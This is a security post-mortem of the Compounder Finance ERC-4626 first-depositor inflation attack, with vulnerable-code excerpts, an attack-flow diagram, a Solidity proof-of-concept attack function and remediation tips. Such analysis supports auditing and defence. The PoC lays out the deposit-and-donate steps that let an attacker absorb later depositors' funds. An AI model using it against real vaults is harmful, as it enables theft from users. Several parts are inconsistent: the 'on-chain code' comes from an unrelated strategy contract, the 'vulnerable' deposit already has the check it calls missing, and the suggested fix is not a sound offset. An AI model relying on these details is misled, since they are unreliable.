# Compounder Finance — ERC-4626 Inflation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2023-06-12 |
| **Protocol** | Compounder Finance |
| **Chain** | Ethereum |
| **Loss** | ~27,174K USD |
| **Attacker** | [0x0e816b0d...](https://etherscan.io/address/0x0e816b0d0a66252c72af822d3e0773a2676f3278) |
| **Attack Contract** | [0x2d797317...](https://etherscan.io/address/0x2d7973177d594237a9b347cd41082af4cbb40f2b) |
| **Attack Tx** | [0xcff84cc1...](https://etherscan.io/tx/0xcff84cc137c92e427f720ca1f2b36fbad793f34ec5117eed127060686e6797b1) |
| **Vulnerable Contract** | [0xaf274e91...](https://etherscan.io/address/0xaf274e912243b19b882f02d731dacd7cd13072d0) |
| **Root Cause** | ERC-4626 vault first depositor attack (share price inflation) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-06/CompounderFinance_exp.sol) |

---
## 1. Vulnerability Overview

The ERC-4626-based vault of Compounder Finance is vulnerable to a first depositor attack. The attacker deposits 1 wei to obtain 1 share, then directly transfers a large amount of assets to the vault to manipulate the asset-to-share ratio. Subsequently, when a victim makes a deposit, the number of shares they receive rounds down to 0 due to rounding error, causing their assets to be absorbed by the attacker. This is the same pattern as the Hundred Finance (April) vulnerability.

## 2. Vulnerable Code Analysis

```solidity
// ❌ ERC-4626 first depositor vulnerability
function convertToShares(uint256 assets) public view returns (uint256) {
    uint256 supply = totalSupply();
    // ❌ If supply is 1 and totalAssets is very large,
    // victim's assets * 1 / totalAssets → 0 (rounded down)
    return supply == 0 ? assets : assets * supply / totalAssets();
}

function deposit(uint256 assets, address receiver) public returns (uint256 shares) {
    shares = convertToShares(assets);
    // ❌ shares = 0 → victim loses assets
    require(shares > 0, "Zero shares");  // vulnerable if this check is absent
    _mint(receiver, shares);
    asset.transferFrom(msg.sender, address(this), assets);
}
```

```solidity
// ✅ Fix: virtual balance pattern
function totalAssets() public view returns (uint256) {
    return asset.balanceOf(address(this)) + VIRTUAL_SHARES; // ✅ minimum offset
}
uint256 constant VIRTUAL_SHARES = 1000; // prevents rounding errors
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: StrategyDAICurve.sol
  function getPricePerFullShare() external view returns (uint);  // ❌

// ...

  function get_virtual_price() external view returns (uint);  // ❌

// ...

    function balanceOfYYCRVinYCRV() public view returns (uint) {
        return balanceOfYYCRV().mul(yERC20(yycrv).getPricePerFullShare()).div(1e18);  // ❌
    }

// ...

    function balanceOfYYCRVinyTUSD() public view returns (uint) {
        return balanceOfYYCRVinYCRV().mul(ICurveFi(curve).get_virtual_price()).div(1e18);  // ❌
    }

// ...

    function balanceOfYCRVyTUSD() public view returns (uint) {
        return balanceOfYCRV().mul(ICurveFi(curve).get_virtual_price()).div(1e18);  // ❌
    }
```

## 3. Attack Flow

```
┌──────────────────────────────────────────┐
│  1. Deposit 1 wei to vault → obtain 1 share     │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  2. Directly transfer large amount of cDAI (donate)         │
│     totalAssets surges, share price skyrockets   │
│     1 share = millions of cDAI               │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  3. Victim calls deposit(large amount)              │
│     convertToShares → rounds down → 0 shares │
│     Victim's assets absorbed into vault              │
└──────────────────────┬───────────────────┘
                       ▼
┌──────────────────────────────────────────┐
│  4. Attacker redeems 1 share → acquires all assets │
└──────────────────────────────────────────┘
```

## 4. PoC Code

```solidity
function attack() external {
    // 1. Deposit 1 wei to obtain 1 share
    cDAI.approve(address(vault), 1);
    vault.deposit(1, address(this));

    // 2. Directly transfer large amount to vault (totalAssets inflation)
    uint256 donateAmount = 1_000_000e18;
    cDAI.transfer(address(vault), donateAmount);
    // share price: 1 share = 1_000_001 cDAI

    // 3. When victim deposits, shares = 0 → assets stolen

    // 4. Attacker redeems all shares
    vault.redeem(1, address(this), address(this));
    // → recovers donateAmount + all victim assets
}
```

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matching Pattern |
|----|--------|--------|-----|-----------|
| V-01 | ERC-4626 first depositor inflation | CRITICAL | CWE-682 | 05_integer_issues.md |
| V-02 | Rounding error (integer division) | HIGH | CWE-190 | 05_integer_issues.md |

## 6. Remediation Recommendations

### Immediate Action
```solidity
// ✅ Use OpenZeppelin ERC4626 _decimalsOffset()
function _decimalsOffset() internal view virtual override returns (uint8) {
    return 3; // ✅ prevents rounding errors with 1000x virtual shares
}
```

### Structural Improvements
| Vulnerability | Recommended Action |
|--------|-----------|
| First depositor attack | Protocol provides initial liquidity (dead shares) |
| Rounding error | Apply _decimalsOffset or virtual balance pattern |

## 7. Lessons Learned

1. ERC-4626 vaults are structurally vulnerable to first depositor attacks. OpenZeppelin's latest ERC4626 implementation (v4.9+) mitigates this via `_decimalsOffset()`.
2. The same vulnerability recurs across protocols — Hundred Finance (April), Compounder Finance (June), etc. A first depositor attack item is mandatory in any ERC-4626 vault audit checklist.